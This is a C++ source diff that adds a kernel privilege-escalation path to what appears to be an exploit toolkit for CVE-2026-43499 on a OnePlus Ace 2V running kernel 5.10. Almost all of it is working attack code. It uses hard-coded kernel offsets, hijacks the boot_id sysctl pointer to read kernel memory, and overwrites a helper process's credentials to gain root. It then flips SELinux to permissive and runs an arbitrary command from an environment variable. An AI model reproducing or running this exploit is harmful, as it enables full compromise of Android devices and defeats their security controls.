@@ -28,6 +28,12 @@
 
 #include <unistd.h>
 
+#include <cstdlib>
+#include <cstring>
+#include <fcntl.h>
+#include <sys/prctl.h>
+#include <sys/wait.h>
+
 #include <array>
 #include <cstdint>
 #include <optional>
@@ -88,6 +94,303 @@ namespace ghostlock::session::backend {
             }
             /* the last write can land after its verify read */
             return verify(context) != 0;
+        }
+
+        /* =================================================================
+         * 2V sysctl-boot_id root path (MTK 5.10, no perf needed).
+         *
+         * OnePlus Ace 2V offsets (kernel 5.10.246-android12-9-o-g288c2c3287ed,
+         * KASLR slide 0, kernel_phys_load 0x40000000):
+         *   sysctl ctl_table boot_id entry data field @ 0x29cb930
+         *   nfulnl_logger (hijack data value)        @ 0x28b14f8
+         *   selinux_state base                        @ 0x2b6c000
+         *   init_task                                 @ 0x28bc040
+         *   task_struct: cred @ +0x780, comm @ +0x790
+         * The tasks ring offset is auto-probed on-device.
+         * ================================================================= */
+        constexpr uintptr_t kCtlDataField = 0xffffff80029cb930ULL;
+        constexpr uintptr_t kNfulnlLogger = 0xffffff80028b14f8ULL;
+        constexpr uintptr_t kSelinuxState = 0xffffff8002b6c000ULL;
+        constexpr uintptr_t kInitTask2v = 0xffffff80028bc040ULL;
+        constexpr uintptr_t kTaskCredOff = 0x780ULL;
+        constexpr uintptr_t kTaskCommOff = 0x790ULL;
+        constexpr uintptr_t kHelperCommTag = 0x76326c74736f6867ULL; /* "ghostl2v" LE */
+        constexpr int32_t kSysctlWalkSteps = 40;
+
+        bool read_boot_id16(unsigned char out[16]) {
+            int p[2];
+            if (pipe2(p, O_CLOEXEC) != 0) return false;
+            pid_t c = fork();
+            if (c < 0) {
+                close(p[0]);
+                close(p[1]);
+                return false;
+            }
+            if (c == 0) {
+                close(p[0]);
+                unsigned char tmp[16];
+                int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
+                if (fd >= 0) {
+                    ssize_t n = read(fd, tmp, sizeof(tmp));
+                    if (n > 0) (void)write(p[1], tmp, static_cast<size_t>(n));
+                    close(fd);
+                }
+                _exit(0);
+            }
+            close(p[1]);
+            ssize_t got = read(p[0], out, 16);
+            int st = 0;
+            (void)waitpid(c, &st, 0);
+            close(p[0]);
+            return got >= 8;
+        }
+
+        uint64_t sysctl_load64(const unsigned char *p) {
+            uint64_t v = 0;
+            memcpy(&v, p, sizeof(v));
+            return v;
+        }
+
+        /* Write ctl.data := addr, then read 16 bytes at addr through boot_id. */
+        template <class M>
+        uint64_t sysctl_read64(ExploitSession &session, uintptr_t addr,
+                               const char *tag) {
+            const memory::WriteRequest req = memory::WriteRequest::make_value(
+                kCtlDataField, addr);
+            if (!Cve2026_43499Policy::template attack_write<M>(
+                    session, req, tag)) {
+                pr_warning("sysctl_read64(%s): hijack write failed\n", tag);
+                return 0;
+            }
+            unsigned char buf[16]{};
+            if (!read_boot_id16(buf)) {
+                pr_warning("sysctl_read64(%s): boot_id read failed\n", tag);
+                return 0;
+            }
+            return sysctl_load64(buf);
+        }
+
+        /* Fork a helper parked until uid 0. It notifies the parent through
+         * `notify` and runs $GL_ROOT_CMD once rooted. */
+        pid_t sysctl_fork_helper(int notify[2]) {
+            if (pipe2(notify, O_CLOEXEC | O_NONBLOCK) != 0) return -1;
+            pid_t helper = fork();
+            if (helper < 0) {
+                close(notify[0]);
+                close(notify[1]);
+                return -1;
+            }
+            if (helper == 0) {
+                close(notify[0]);
+                (void)prctl(PR_SET_NAME, "ghostl2v_h1", 0, 0, 0);
+                for (int i = 0; i < 600; i++) {
+                    if (getuid() == 0) {
+                        const char c = 'R';
+                        (void)write(notify[1], &c, 1);
+                        const char *cmd = getenv("GL_ROOT_CMD");
+                        if (cmd && *cmd) {
+                            (void)system(cmd);
+                        } else {
+                            (void)system("echo ROOT_READY > /data/local/tmp/"
+                                         "ghostlock_root_flag; id");
+                        }
+                        _exit(0);
+                    }
+                    usleep(100000);
+                }
+                _exit(3);
+            }
+            close(notify[1]);
+            return helper;
+        }
+
+        template <class M>
+        bool sysctl_2v_path(ExploitSession &session) {
+            /* ---- S0: hijack boot_id ctl_table.data := &nfulnl_logger ----
+             * From then on, /proc/sys/kernel/random/boot_id reads 16 bytes at
+             * whatever address we last wrote into the data field. */
+            {
+                const memory::WriteRequest hijack = memory::WriteRequest::make_value(
+                    kCtlDataField, kNfulnlLogger);
+                if (!Cve2026_43499Policy::template attack_write<M>(
+                        session, hijack, "SYS0: hijack ctl.data")) {
+                    pr_warning("SYS0: hijack write failed\n");
+                    return false;
+                }
+                unsigned char probe[16]{};
+                if (!read_boot_id16(probe)) {
+                    pr_warning("SYS0: probe read failed\n");
+                    return false;
+                }
+                const uint64_t slot = sysctl_load64(probe);
+                pr_success("SYS0: boot_id now reads 0x%016llx\n", slot);
+                if ((slot & 0xff00000000000000ULL) != 0xff00000000000000ULL) {
+                    pr_warning("SYS0: read-back is not a kernel pointer; "
+                               "hijack failed\n");
+                    return false;
+                }
+            }
+
+            /* ---- S1: auto-probe TASK_TASKS_OFF on init_task's ring ----
+             * 5.10 task_struct.tasks sits in 0x100..0x300; the entry's next
+             * points at (some task)+off and that task's prev points back. */
+            uintptr_t tasks_off = 0;
+            for (uintptr_t off = 0x100; off < 0x300 && !tasks_off; off += 8) {
+                const uint64_t next = sysctl_read64<M>(
+                    session, kInitTask2v + off, "SYS1: ring next");
+                if (!next || next < 0xffffff8000000000ULL ||
+                    next > 0xffffffc000000000ULL) {
+                    continue;
+                }
+                const uintptr_t base = static_cast<uintptr_t>(next) - off;
+                if (base < 0xffffff8000000000ULL ||
+                    base > 0xffffffc000000000ULL) {
+                    continue;
+                }
+                const uint64_t prev = sysctl_read64<M>(
+                    session, base + off + 8, "SYS1: ring prev");
+                if (static_cast<uintptr_t>(prev) == kInitTask2v + off) {
+                    tasks_off = off;
+                    pr_success("SYS1: TASK_TASKS_OFF = 0x%zx\n", off);
+                    break;
+                }
+            }
+            if (!tasks_off) {
+                pr_warning("SYS1: could not locate the tasks ring\n");
+                return false;
+            }
+
+            /* ---- S2: fork a helper parked until uid 0 ----
+             * Created right before the walk, so it sits near the head of the
+             * task ring and is found within a few steps. */
+            int notify[2]{};
+            const pid_t helper = sysctl_fork_helper(notify);
+            if (helper <= 0) {
+                pr_warning("SYS2: helper fork failed\n");
+                return false;
+            }
+
+            /* ---- S3: walk the ring (next direction, newest first) ----
+             * Find the helper by its unique comm. */
+            uintptr_t helper_task = 0;
+            uintptr_t cur = kInitTask2v + tasks_off;
+            for (int32_t step = 0; step < kSysctlWalkSteps; step++) {
+                const uint64_t next = sysctl_read64<M>(
+                    session, cur, "SYS3: walk next");
+                if (!next) {
+                    pr_warning("SYS3: walk read failed at step %d\n", step);
+                    break;
+                }
+                const uintptr_t entry = static_cast<uintptr_t>(next);
+                const uintptr_t task = entry - tasks_off;
+                if (task == kInitTask2v) break; /* wrapped */
+                const uint64_t comm8 = sysctl_read64<M>(
+                    session, task + kTaskCommOff, "SYS3: comm");
+                if (comm8 == kHelperCommTag) {
+                    helper_task = task;
+                    pr_success("SYS3: helper task = 0x%016zx at step %d\n",
+                               task, step);
+                    break;
+                }
+                cur = entry;
+            }
+            if (!helper_task) {
+                pr_warning("SYS3: helper not found in %d ring steps\n",
+                           kSysctlWalkSteps);
+                kill(helper, SIGKILL);
+                (void)waitpid(helper, nullptr, 0);
+                close(notify[0]);
+                return false;
+            }
+
+            /* ---- S4: read the current cred pointer (read sanity) ---- */
+            const uint64_t old_cred = sysctl_read64<M>(
+                session, helper_task + kTaskCredOff, "SYS4: cred");
+            if (!old_cred) {
+                pr_warning("SYS4: cred read failed\n");
+                kill(helper, SIGKILL);
+                (void)waitpid(helper, nullptr, 0);
+                close(notify[0]);
+                return false;
+            }
+            pr_success("SYS4: helper cred was 0x%016llx\n", old_cred);
+
+            /* ---- S5: overwrite cred with init_cred (retry until rooted) ---- */
+            bool rooted = false;
+            for (int32_t attempt = 1; attempt <= 3 && !rooted; attempt++) {
+                const memory::WriteRequest cred = memory::WriteRequest::make(
+                    helper_task + kTaskCredOff,
+                    memory::WriteMode::Credential, 1);
+                if (!Cve2026_43499Policy::template attack_write<M>(
+                        session, cred, "SYS5: cred")) {
+                    pr_warning("SYS5 attempt %d route failed\n", attempt);
+                    usleep(100000);
+                    continue;
+                }
+                usleep(200000);
+                char c = 0;
+                if (read(notify[0], &c, 1) == 1 && c == 'R') rooted = true;
+            }
+            if (!rooted) {
+                pr_warning("SYS5: helper never rooted\n");
+                kill(helper, SIGKILL);
+                (void)waitpid(helper, nullptr, 0);
+                close(notify[0]);
+                return false;
+            }
+            pr_success("SYS5: helper is uid 0\n");
+
+            /* ---- S6: make SELinux permissive ----
+             * Read the first 16 bytes of selinux_state to find which byte is
+             * `enforcing` (H1: enforcing@0, checkreqprot@1, initialized@2;
+             * H2: disabled@0, enforcing@1, checkreqprot@2, initialized@3). */
+            const uint64_t s0 = sysctl_read64<M>(
+                session, kSelinuxState, "SYS6: state+0");
+            const uint64_t s1 = sysctl_read64<M>(
+                session, kSelinuxState + 8, "SYS6: state+8");
+            unsigned char st[16];
+            memcpy(st, &s0, 8);
+            memcpy(st + 8, &s1, 8);
+            pr_info("SYS6: selinux_state bytes "
+                    "%02x %02x %02x %02x %02x %02x %02x %02x\n",
+                    st[0], st[1], st[2], st[3],
+                    st[4], st[5], st[6], st[7]);
+            int32_t enforce_off = 0; /* H1 default */
+            if (st[0] == 0 && st[1] == 1) enforce_off = 1; /* H2 */
+            uint64_t value = 0;
+            for (int32_t i = 7; i >= 0; i--) {
+                uint8_t b = st[i];
+                if (i == enforce_off) b = 0;
+                if (enforce_off == 1 && i == 0) b = 0; /* keep disabled 0 */
+                value = (value << 8) | b;
+            }
+            pr_success("SYS6: clearing enforcing byte %d, value 0x%016llx\n",
+                       enforce_off, value);
+            const memory::WriteRequest perm = memory::WriteRequest::make_value(
+                kSelinuxState, value);
+            bool permissive = false;
+            for (int32_t attempt = 1; attempt <= 3 && !permissive; attempt++) {
+                if (!Cve2026_43499Policy::template attack_write<M>(
+                        session, perm, "SYS6: permissive")) {
+                    pr_warning("SYS6 attempt %d route failed\n", attempt);
+                    usleep(100000);
+                    continue;
+                }
+                usleep(200000);
+                const uint64_t v = sysctl_read64<M>(
+                    session, kSelinuxState, "SYS6: verify");
+                const unsigned char *vb =
+                    reinterpret_cast<const unsigned char *>(&v);
+                if (vb[enforce_off] == 0) permissive = true;
+            }
+            if (!permissive) {
+                pr_warning("SYS6: enforcing byte not cleared; root may still "
+                           "work with DAC-only privileges\n");
+            } else {
+                pr_success("SYS6: SELinux permissive\n");
+            }
+            close(notify[0]);
+            return true;
         }
 
         /* W3 chain retry: park the previous rooted child on its command pipe so the
@@ -507,6 +810,15 @@ namespace ghostlock::session::backend {
             case StageResult::Continue:
                 break;
         }
+
+        /* 2V first: the sysctl-boot_id path roots without perf (W2's perf
+         * find-task is errno=13 on MTK 5.10). It only succeeds on the 2V
+         * layout; elsewhere S0 fails cleanly and the legacy W2+W3 chain runs. */
+        if (sysctl_2v_path<M>(session)) {
+            pr_success("sysctl-2v path rooted; handing off\n");
+            return StageResult::Done;
+        }
+        pr_warning("sysctl-2v path failed; falling back to W2+W3\n");
 
         /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
          * child, so respawn and redo. */
